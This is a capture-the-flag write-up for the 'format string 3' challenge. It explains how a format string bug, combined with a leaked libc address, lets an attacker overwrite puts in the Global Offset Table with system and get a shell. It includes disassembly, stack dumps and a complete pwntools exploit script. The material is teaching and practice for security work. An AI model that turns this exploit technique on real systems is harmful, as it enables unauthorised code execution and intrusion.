# Writeup: format string 3

## Overview

This challenge involves exploiting a format string vulnerability to overwrite function pointer in a program to gain shell access.

## Analysis

### Code Overview

1. Local Variable Initialisation

- The program initialise a string `/bin/sh` which provide a shell.

```c
char *normal_string = "/bin/sh";
```

2. hello function

- The function prints a message and leaks the address of `setvbuf` in libc, which actually ease our exploiation.

```c
void hello() {
        puts("Howdy gamers!");
        printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}
```

3. main function

- The `main` function:
  1. Call `hello` function.
  1. Prompts user to input a string.
  1. Prints the user input using `print(buf)`.
  1. Prints `/bin/sh` using `puts` function.

### Vulnerability

1. The use of `print(buf)` without a format specifier leads to a format string vulnerability.

## Exploitation Strategy

The goal is to exploit the format string vulnerability to call `/bin/sh` to gain shell access to obtain flag.

1. Determine the stack position of the user input.

2. Calculate the offset between `setvbuf` and `system` function in libc.

3. Determine the address of `puts` in the Global Offset Table (GOT).

4. Craft a payload that overwrites the address of `puts` function with `system` function.

5. Execute the payload to call `/bin/sh` and obtain shell access. 

## Exploitation steps

1. Determine the stack position of the user input.

- Run the program in GDB.

```terminal
$ gdb format-string-3
```

- Disassemble the `main` function to find a suitable breakpoint.

```terminal
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401243 <+0>:     endbr64
   0x0000000000401247 <+4>:     push   rbp
   0x0000000000401248 <+5>:     mov    rbp,rsp
   0x000000000040124b <+8>:     sub    rsp,0x510
   0x0000000000401252 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x000000000040125b <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040125f <+28>:    xor    eax,eax
   0x0000000000401261 <+30>:    lea    rdx,[rbp-0x510]
   0x0000000000401268 <+37>:    mov    eax,0x0
   0x000000000040126d <+42>:    mov    ecx,0x20
   0x0000000000401272 <+47>:    mov    rdi,rdx
   0x0000000000401275 <+50>:    rep stos QWORD PTR es:[rdi],rax
   0x0000000000401278 <+53>:    mov    QWORD PTR [rbp-0x410],0x0
   0x0000000000401283 <+64>:    mov    QWORD PTR [rbp-0x408],0x0
   0x000000000040128e <+75>:    lea    rdx,[rbp-0x400]
   0x0000000000401295 <+82>:    mov    eax,0x0
   0x000000000040129a <+87>:    mov    ecx,0x7e
   0x000000000040129f <+92>:    mov    rdi,rdx
   0x00000000004012a2 <+95>:    rep stos QWORD PTR es:[rdi],rax
   0x00000000004012a5 <+98>:    mov    eax,0x0
   0x00000000004012aa <+103>:   call   0x4011a6 <setup>
   0x00000000004012af <+108>:   mov    eax,0x0
   0x00000000004012b4 <+113>:   call   0x40120b <hello>
   0x00000000004012b9 <+118>:   mov    rdx,QWORD PTR [rip+0x2db0]        # 0x404070 <stdin@GLIBC_2.2.5>
   0x00000000004012c0 <+125>:   lea    rax,[rbp-0x410]
   0x00000000004012c7 <+132>:   mov    esi,0x400
   0x00000000004012cc <+137>:   mov    rdi,rax
   0x00000000004012cf <+140>:   call   0x4010b0 <fgets@plt>
   0x00000000004012d4 <+145>:   lea    rax,[rbp-0x410]
   0x00000000004012db <+152>:   mov    rdi,rax
   0x00000000004012de <+155>:   mov    eax,0x0
   0x00000000004012e3 <+160>:   call   0x4010a0 <printf@plt>
   0x00000000004012e8 <+165>:   mov    rax,QWORD PTR [rip+0x2d59]        # 0x404048 <normal_string>
   0x00000000004012ef <+172>:   mov    rdi,rax
   0x00000000004012f2 <+175>:   call   0x401080 <puts@plt>
   0x00000000004012f7 <+180>:   mov    eax,0x0
   0x00000000004012fc <+185>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401300 <+189>:   sub    rdx,QWORD PTR fs:0x28
   0x0000000000401309 <+198>:   je     0x401310 <main+205>
   0x000000000040130b <+200>:   call   0x401090 <__stack_chk_fail@plt>
   0x0000000000401310 <+205>:   leave
   0x0000000000401311 <+206>:   ret
End of assembler dump.
```

- Break point is set after input(`fgets`).

```terminal
gef➤  b *0x00000000004012d4
Breakpoint 1 at 0x4012d4
```

- Run and inspect the stack.

```terminal
gef➤  run
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7ffff7e5a3f0
AAAAAAAA
gef➤  tele $rsp -l 50
0x00007fffffffd7f0│+0x0000: 0x0000000000000000   ← $rsp
0x00007fffffffd7f8│+0x0008: 0x0000000000000000
0x00007fffffffd800│+0x0010: 0x0000000000000000
0x00007fffffffd808│+0x0018: 0x0000000000000000
0x00007fffffffd810│+0x0020: 0x0000000000000000
0x00007fffffffd818│+0x0028: 0x0000000000000000
0x00007fffffffd820│+0x0030: 0x0000000000000000
0x00007fffffffd828│+0x0038: 0x0000000000000000
0x00007fffffffd830│+0x0040: 0x0000000000000000
0x00007fffffffd838│+0x0048: 0x0000000000000000
0x00007fffffffd840│+0x0050: 0x0000000000000000
0x00007fffffffd848│+0x0058: 0x0000000000000000
0x00007fffffffd850│+0x0060: 0x0000000000000000
0x00007fffffffd858│+0x0068: 0x0000000000000000
0x00007fffffffd860│+0x0070: 0x0000000000000000
0x00007fffffffd868│+0x0078: 0x0000000000000000
0x00007fffffffd870│+0x0080: 0x0000000000000000
0x00007fffffffd878│+0x0088: 0x0000000000000000
0x00007fffffffd880│+0x0090: 0x0000000000000000
0x00007fffffffd888│+0x0098: 0x0000000000000000
0x00007fffffffd890│+0x00a0: 0x0000000000000000
0x00007fffffffd898│+0x00a8: 0x0000000000000000
0x00007fffffffd8a0│+0x00b0: 0x0000000000000000
0x00007fffffffd8a8│+0x00b8: 0x0000000000000000
0x00007fffffffd8b0│+0x00c0: 0x0000000000000000
0x00007fffffffd8b8│+0x00c8: 0x0000000000000000
0x00007fffffffd8c0│+0x00d0: 0x0000000000000000
0x00007fffffffd8c8│+0x00d8: 0x0000000000000000
0x00007fffffffd8d0│+0x00e0: 0x0000000000000000
0x00007fffffffd8d8│+0x00e8: 0x0000000000000000
0x00007fffffffd8e0│+0x00f0: 0x0000000000000000
0x00007fffffffd8e8│+0x00f8: 0x0000000000000000
0x00007fffffffd8f0│+0x0100: "AAAAAAAA\n"         ← $rax, $rcx
0x00007fffffffd8f8│+0x0108: 0x000000000000000a ("\n"?)
0x00007fffffffd900│+0x0110: 0x0000000000000000
0x00007fffffffd908│+0x0118: 0x0000000000000000
0x00007fffffffd910│+0x0120: 0x0000000000000000
0x00007fffffffd918│+0x0128: 0x0000000000000000
0x00007fffffffd920│+0x0130: 0x0000000000000000
0x00007fffffffd928│+0x0138: 0x0000000000000000
0x00007fffffffd930│+0x0140: 0x0000000000000000
0x00007fffffffd938│+0x0148: 0x0000000000000000
0x00007fffffffd940│+0x0150: 0x0000000000000000
0x00007fffffffd948│+0x0158: 0x0000000000000000
0x00007fffffffd950│+0x0160: 0x0000000000000000
0x00007fffffffd958│+0x0168: 0x0000000000000000
0x00007fffffffd960│+0x0170: 0x0000000000000000
0x00007fffffffd968│+0x0178: 0x0000000000000000
0x00007fffffffd970│+0x0180: 0x0000000000000000
0x00007fffffffd978│+0x0188: 0x0000000000000000
```

- The input is on 33th of the stack but in 64-bit the first 5 places of the stack are registers.

- Thus the stack position of user input is on 38th.

2. Calculate the offset between `setvbuf` function and `system` function in libc.

- Get the address of `setvbuf` and `system` in libc using `objdump` or `nm`.

  - Using `objdump`:
```terminal
$ objdump -T libc.so.6 | grep setvbuf
000000000007a3f0  w   DF .text  0000000000000260  GLIBC_2.2.5 setvbuf
$ objdump -T libc.so.6 | grep system
000000000004f760  w   DF .text  000000000000002d  GLIBC_2.2.5 system
```

  - Using `nm`:
```terminal
$ nm -D libc.so.6 | grep setvbuf
000000000007a3f0 W setvbuf@@GLIBC_2.2.5
$ nm -D libc.so.6 | grep system 
000000000004f760 W system@@GLIBC_2.2.5
```
- Thus the address of `setvbuf` is `0x7a3f0` and address of `system` is `0x4f760`.

- Note that these address are just from libc, when the program run, libc is placed on a random memory.

- Simply find their offset with the help of `python`.

```terminal
$ python
>>> 0x4f760-0x7a3f0
-175248
```

- Thus the address of `system` is 175248 before `setvbuf`.

3. Determine the address of `puts` in the Global Offset Table.

```terminal
$ objdump -D format-string-3| grep puts
0000000000401080 <puts@plt>:
  401084:       f2 ff 25 8d 2f 00 00    bnd jmp *0x2f8d(%rip)        # 404018 <puts@GLIBC_2.2.5>
```

4. Crafting payload using Python and `pwntools`.

- Revise back the important info we have:
  - `hello` function leaks the address of `setvbuf`.
  - User input is on 38th of stack.
  - Offset of `setvbuf` and `system` is 175248. 
  - The address of `puts` in Global Offset Table is `0x404018`.

- Draft the process of python code:
  - Run the program.
  - Get the leaked `setvbuf` address.
  - Calculate `system` address using the leaked `setvbuf` address and the offset.
  - Craft the payload using `fmtstr_payload()` function.
  - Send the payload and get the shell access.

```python
#! /usr/bin/python3

from pwn import *

context.update(arch='amd64')

p = process('./format-string-3')  
#p = remote('rhea.picoctf.net',53286)

info(p.recvline())       # Fetch Howdy Gamers!
info(p.recvuntil('libc: '))

# Get setvbuffer address in string and convert to int
setvbuf_addr_str = p.recvline().strip()
setvbuf_addr = int(setvbuf_addr_str,16)
info('Leaked setvbuf address: %s', hex(setvbuf_addr))

#INFO I GOT
puts_addr = 0x404018
# setvbuf address in libc = 0x7a3f0
# system address in libc = 0x4f760
#offset setvbuf - system = 175248
#user input start from 38th of stack

# Calculate system address
offset = 175248
system_addr = setvbuf_addr - offset
info('Calculated system address: %s', hex(system_addr))

# Crafting payload
info('Crafting payload...')
payload = fmtstr_payload(38, {puts_addr : system_addr})

# Send payload
info('Sending payload...')
p.sendline(payload)
p.clean()

# Get the shell
info('Successful payload, got the shell')
p.interactive()
```

5. Output the flag after obtain the shell access.

```terminal
$ ./exploit.py
[+] Starting local process './format-string-3': pid 66163
[*] Howdy gamers!
[*] Okay I'll be nice. Here's the address of setvbuf in libc: 
[*] Leaked setvbuf address: 0x7f05a6ba03f0
[*] Calculated system address: 0x7f05a6b75760
[*] Crafting payload...
[*] Sending payload...
[*] Successful payload, got the shell
[*] Switching to interactive mode
$ cat flag.txt
got the flag
```

## Conclusion
This challenge requires an understanding of Global Offset Table(GOT), and exploiting format string vulnerabilities to overwrite GOT to gain shell access. 
